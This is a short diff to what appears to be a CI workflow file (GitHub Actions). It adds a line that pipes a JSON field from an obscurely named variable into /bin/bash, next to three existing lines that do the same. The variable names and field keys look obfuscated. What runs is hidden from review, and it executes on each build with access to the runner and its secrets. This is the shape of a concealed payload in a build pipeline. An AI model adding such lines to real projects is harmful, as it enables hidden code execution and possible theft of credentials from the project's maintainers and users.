@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$y6" | jq -r .c1316 | /bin/bash
           echo $k44 | jq -r .rwtop74 | /bin/bash
           echo $anw9 | jq -r .t215 | /bin/bash
+          printf '%s' "$zpxe1" | jq -r .ekafo3 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
